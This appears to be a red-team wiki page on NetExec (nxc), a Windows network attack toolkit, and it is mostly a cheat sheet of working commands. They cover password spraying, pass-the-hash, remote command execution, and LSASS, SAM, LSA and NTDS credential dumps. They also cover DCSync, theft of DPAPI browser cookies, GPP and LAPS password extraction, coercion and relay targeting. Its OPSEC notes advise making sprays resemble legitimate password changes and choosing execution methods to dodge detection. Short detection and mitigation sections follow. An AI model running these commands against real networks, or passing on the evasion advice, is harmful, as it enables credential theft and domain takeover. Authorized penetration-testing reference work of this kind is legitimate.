---
title: NetExec (nxc) — formerly CrackMapExec (cme)
type: entity
created: 2026-09-06
updated: 2026-09-07
tags: [tool, python, scanning, post-exploitation, smb, winrm, netexec]
---

# NetExec (nxc)

**NetExec** (`nxc`) is the actively maintained **mass scanning + execution**
toolkit for Windows networks. It brute-forces, enumerates, and executes across
many hosts over SMB, WinRM, LDAP, SSH, MSSQL, RDP, WMI, and more. It's the fast
way to validate creds, map local admins, check services, and push commands/dumps
across a fleet — the scanning companion to [[bloodhound]] (which plans) and
[[impacket]] (which does one target deep).

## Naming: CrackMapExec is unmaintained

- Created 2015 as **CrackMapExec** (`cme`) by byt3bl33d3r; maintained by mpgn
  (Pennyw0rth) 2019–2023.
- **September 2023**: mpgn retired as maintainer; the most active contributors
  (NeffIsBack, Marshall-Hallenbeck, zblurx) continued the project as
  **NetExec** in `Pennyw0rth/NetExec`. The original CrackMapExec repo is the
  legacy, unmaintained codebase — new work happens on NetExec.
- The canonical binary is **`nxc`**; `cme` still resolves as a legacy alias,
  but read/write `nxc` in runbooks.
- **Syntax changed**: CME subcommand modules (`cme smb <ip> lsass`) became
  **`-M` modules** (`nxc smb <ip> -M lsassy`), and the old `spider`/`mimikatz`
  subcommands are now modules/flags (`-M spider_plus`, `--spider`, `-M mimikatz`).

## Protocols

- `smb` — the workhorse: auth checks, local-admin enumeration, version/service
  checks, exec, LSASS/SAM/NTDS dumps, share spidering.
- `winrm` — auth + PowerShell remoting execution.
- `ldap` — domain/user/group enumeration, **kerberoasting/ASREProast built
  in**, delegation findings, **BloodHound ingestor**, pre2k, gMSA.
- `ssh` / `mssql` / `rdp` / `wmi` / `ftp` / `nfs` / `vnc` — other protocols.
- Execution engines: `wmiexec` / `atexec` (scheduled task) / `smbexec` —
  automatic failover in that order, or force one with `--exec-method`.

## Common invocations

```bash
# Brute / validate creds + local-admin check across a subnet
nxc smb 10.0.10.0/24 -u user -p 'P@ss' --local-auth

# Kerberos (ticket) auth
nxc smb 10.0.10.5 -u user -k

# Hash (PtH) auth
nxc smb 10.0.10.5 -u user -H <nt>

# Exec a command / PowerShell (auto wmiexec→atexec→smbexec failover)
nxc smb 10.0.10.5 -u user -p pass -x 'whoami /all'
nxc smb 10.0.10.5 -u user -p pass -X '$PSVersionTable'

# LSASS dump (lsassy is the current default; nanodump is an alternative)
nxc smb 10.0.10.5 -u user -p pass -M lsassy
nxc smb 10.0.10.5 -u user -p pass -M nanodump

# Mimikatz module (deprecated) — e.g. remote DCSync
nxc smb 10.0.10.5 -u user -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:corp /user:krbtgt"'

# Spider a share (flag) / dump all readable files (module)
nxc smb 10.0.10.5 -u user -p pass --spider C$ --pattern txt
nxc smb 10.0.10.5 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True

# List modules / module options
nxc smb -L
nxc smb -M lsassy --options

# Reuse a stored credential from the results DB
nxc smb 10.0.10.5 -id <credID>
```

## Key flags

| Flag | Purpose |
|---|---|
| `-u` / `-p` | user / password (files allowed; `-u file -p file` = spray) |
| `-H` | NTLM hash auth (or hash file for spraying) |
| `-k` | use the current Kerberos ticket |
| `--local-auth` | local (non-domain) account |
| `-x` / `-X` | run CMD / PowerShell command |
| `--exec-method` | force wmiexec / atexec / smbexec |
| `--amsi-bypass` | PowerShell bypass file for `-X` |
| `-M` / `-o` | module + `KEY=value` options (chainable: `-M a -M b`) |
| `-id` | reuse a credential stored in the nxc DB |
| `--jitter N` / `N-M` | per-host auth throttling (spray OPSEC) |
| `--no-bruteforce` / `--continue-on-success` | spray one password against a user list |
| `-L` | list modules for a protocol |

## Crash course: modern nxc (the hidden gems)

The basics above (`-u/-p/-H/-k`, `-x`, `-M lsassy`) are what everyone knows.
The value in *modern* NetExec is the stuff that isn't in the first tutorial —
built-in secret extraction with **no module**, a persistent results database,
cross-protocol reach, and quality-of-life that makes Kerberos-over-a-tunnel
painless. Rule that never changes: **`nxc <proto> -L` and pin the version** —
the module set moves fast, so confirm what's installed before you rely on it.

### 1. Built-in secret extraction (flags, not modules)

You don't need a module (or a separate Impacket call) for the big dumps —
they're first-class flags on `nxc smb`:

```bash
nxc smb dc01 -u adm -p pass --sam            # local SAM hashes
nxc smb dc01 -u adm -p pass --lsa            # LSA secrets (cached logons, service acct pw, DPAPI machine key)
nxc smb dc01 -u adm -p pass --ntds           # NTDS.dit dump — drsuapi by default...
nxc smb dc01 -u adm -p pass --ntds vss       # ...or VSS snapshot method ([[ntds-dit]], [[dcsync]])
nxc smb dc01 -u adm -p pass --ntds --user krbtgt   # just one principal
```

Two under-used gems in the same family:

```bash
# DPAPI — decrypt masterkeys and harvest browser logins/cookies, Credential
# Manager, RDP creds, Wi-Fi keys — remotely, in one shot. Massive on workstations.
nxc smb host -u adm -p pass --dpapi
nxc smb host -u adm -p pass --dpapi cookies         # also pull browser cookies (session theft)

# SCCM/MECM Network Access Account creds straight off a client/DP
nxc smb host -u adm -p pass --sccm                  # disk + WMI methods ([[sccm-abuse]])
```

`--lsa` giving you the DPAPI machine key + `--dpapi` decrypting user secrets is
the quiet way to turn one local-admin box into a pile of *plaintext* creds
without ever touching [[lsass]] with a dumper (lower Sysmon-10 signal).

### 2. The results database (`nxcdb`) — stop re-typing creds

Every host, cred, share, and loot nxc finds is written to a SQLite DB, and
`-id <credID>` replays a stored cred without re-sending it on your shell
history. The interactive shell makes it an engagement-wide credential store:

```bash
nxcdb                       # interactive DB shell
> workspace create op_acme  # per-engagement workspace (isolate client data)
> workspace op_acme
> proto smb
> creds                     # every cred harvested this op
> hosts                     # every host + admin-access marks
> export creds hashcat      # dump all NT hashes ready for [[hashcat]]
```

Pair with the config at `~/.nxc/nxc.conf` (`[nxc] audit_mode`, workspace
defaults, the `[BloodHound]` block below).

### 3. Lockout-safe spraying (the flags [[password-spraying]] wants)

Beyond `--continue-on-success`, nxc can **cap failures so it stops before it
locks anyone out** — the difference between a clean spray and a helpdesk call:

```bash
nxc smb dc01 -u users.txt -p 'Autumn2025!' --continue-on-success \
    --ufail-limit 1        # stop hitting a given USER after 1 fail
# --gfail-limit N  -> global fail cap;  --fail-limit N -> per-host cap
nxc smb dc01 -u users.txt -p 'Autumn2025!' --no-bruteforce   # zip user[i]<->pass[i], not the full matrix
```

`--ufail-limit 1` + a single password is the lockout-respecting spray from
[[password-spraying]] expressed in nxc; `--jitter 3-5` spaces it.

### 4. Killer modules worth knowing by name

```bash
nxc smb  hosts -u u -p p -M gpp_password      # cpassword from SYSVOL Groups.xml -> instant domain cred
nxc smb  hosts -u u -p p -M gpp_autologin     # autologon creds from GPP
nxc ldap dc01  -u u -p p -M get-desc-users    # user 'description' fields — passwords hide here constantly
nxc ldap dc01  -u u -p p -M maq               # MachineAccountQuota (can you add a computer? -> RBCD/shadow-creds)
nxc ldap dc01  -u u -p p -M laps              # read LAPS passwords you're allowed to ([[laps]])
nxc ldap dc01  -u u -p p -M adcs              # is AD CS present / which CAs (feeds the ESC surface)
nxc smb  host  -u u -p p -M ntlmv1            # is NTLMv1 accepted? (downgrade/relay tell)
nxc smb  host  -u u -p p -M coerce_plus -o LISTENER=10.10.10.10   # consolidated coercion: spooler/petitpotam/dfscoerce/printnightmare in one module ([[ntlm-relay-coercion]], [[printer-bug]])
nxc smb  host  -u u -p p -M keepass_discover  # find KeePass DBs; keepass_trigger to weaponize
nxc smb  host  -u u -p p -M wcc               # Windows config auditor (host hardening review)
```

`-M gpp_password` and `-M get-desc-users` are the two that most often hand you
a credential for *free* on a fresh foothold — run them early ([[ad-enumeration]]).

### 5. It's not just SMB — the other protocols pull their weight

```bash
nxc ldap  dc01 -u u -p p --bloodhound -c all   # collect the graph without a separate ingestor
nxc ldap  dc01 -u u -p p --kerberoasting k.txt --asreproast a.txt   # roast in one pass ([[kerberoasting]], [[as-rep-roasting]])
nxc ldap  dc01 -u u -p p --gmsa                # read gMSA managed passwords over LDAP ([[gmsa]])
nxc mssql sql01 -u sa -p p --local-auth -x whoami   # MSSQL -> xp_cmdshell exec
nxc mssql sql01 -u u  -p p -M mssql_priv        # impersonation / xp_cmdshell privesc chain
nxc winrm host -u u -p p -x whoami              # WinRM exec ([[remote-execution]], and mind the [[kerberos-double-hop]])
nxc ssh   host -u u -p p -x id                  # Linux estates too
nxc smb   10.0.0.0/24 -u u -p p --shares --gen-relay-list relay.txt   # hosts w/o SMB signing -> relay targets
```

### 6. Quality-of-life that fixes Kerberos-over-a-tunnel

The two flags that save the most time when operating from the Linux box over a
pivot ([[pivoting-and-tunneling]]) — build `/etc/hosts` and a working
`krb5.conf` straight from the DC:

```bash
nxc smb dc01 -u u -p p --generate-hosts-file /etc/hosts.add   # DC/domain names for Kerberos SPN binding
nxc smb dc01 -u u -p p --generate-krb5-file  /etc/krb5.conf   # ready-to-use realm config
nxc smb dc01 -u u -p p --dns-server 10.0.0.10 --dns-tcp       # resolve THROUGH the target (SOCKS-friendly)
nxc smb dc01 -u u -k --use-kcache                             # auth with the ccache in $KRB5CCNAME
```

## BloodHound integration

`~/.nxc/nxc.conf`:

```ini
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
```

nxc marks users **owned** in BloodHound as creds are found (e.g. a lsassy dump
with 20 hashes), and the `ldap` protocol has a **BloodHound ingestor** that
feeds BloodHound 2.x directly — so recon and graph-building share one pipeline.
See [[bloodhound]].

## Red-team notes (OPSEC)

- **Throttle sprays** — `--jitter 3-5` is per-host; pair with
  `--continue-on-success` + a single password to look like a legit password
  change wave, not a brute.
- **Pick the exec engine** to match the host's normal profile: `wmiexec`
  (DCOM/Sysmon 1), `atexec` (Task Scheduler 4698), `smbexec` (new service
  7045). The auto-failover is convenient but the fallback order is itself a
  tell if the first methods keep failing.
- **`-id` over re-typing** — the results DB keeps every found cred; reusing IDs
  avoids re-sending hashes/passwords on the wire and in your shell history.
- **Spider with intent** — `--spider C$ --pattern txt` is noisy on big drives;
  `spider_plus -o DOWNLOAD_FLAG=True` copies *everything*, so scope it to the
  shares you actually need.
- **`-L` first** — the module set keeps growing (spooler, iis, winscp, sccm
  dumps, LAPS defeat, schtask_as impersonation); know what's installed before
  the engagement, pin the version.

## Detection

- **4625 / 4624** — auth bursts (brute) and successful logons across many hosts.
- **SMB connection fan-out** — one source IP touching many hosts' SMB/WinRM is
  a mass-scan tell.
- **4688** — the exec command lines (`whoami`, `secretsdump`, lsassy, mimikatz).
- **Exec-engine tells** — 7045 (smbexec service), 4698 (atexec task),
  WMI/DCOM process creation (wmiexec).
- **LSASS access** (Sysmon 10) on targets hit by `lsassy`/`nanodump`.
- **Share enumeration** — SMB share listing bursts (`spider`/`spider_plus`).
- **BloodHound ingest** — an unexpected BH2 collector receiving large dumps.

## Mitigations

- **Alert on auth fan-out** — one source hitting many hosts.
- **Restrict SMB/WinRM** to expected sources; enforce signing + EPA.
- [[ad-tiering-and-hardening]] — limit what a valid low-priv cred can reach
  (nxc with a good cred still only gets what the cred allows).

## Links

- [[bloodhound]] — the planner (nxc is the scanner/executor; BH integration)
- [[impacket]] — the single-target deep tools nxc wraps
- [[lsass]] — the `lsassy`/`nanodump` dump targets
- [[pass-the-hash-and-ticket|PtH/PtT]] — the `-H` / `-k` auth modes
- [[remote-execution]] — wmiexec/atexec/smbexec mechanics
- [[mitm6]] — the network-position attacks nxc pairs with
- [[ad-enumeration]] — the remote enum cheat-cards nxc anchors
- [[password-spraying]] — the lockout-safe spray flags (`--ufail-limit`, `--jitter`)
- [[pivoting-and-tunneling]] — running nxc from the operator host over the tunnel
- [[sccm-abuse]] / [[laps]] / [[gmsa]] — secrets the built-in flags/modules pull
- [[ntds-dit]] / [[dcsync]] — what `--ntds` dumps and how

## References

- [NetExec (GitHub)](https://github.com/Pennyw0rth/NetExec)
- [NetExec documentation](https://www.netexec.wiki/)
- [CrackMapExec (legacy, unmaintained)](https://github.com/byt3bl33d3r/CrackMapExec)
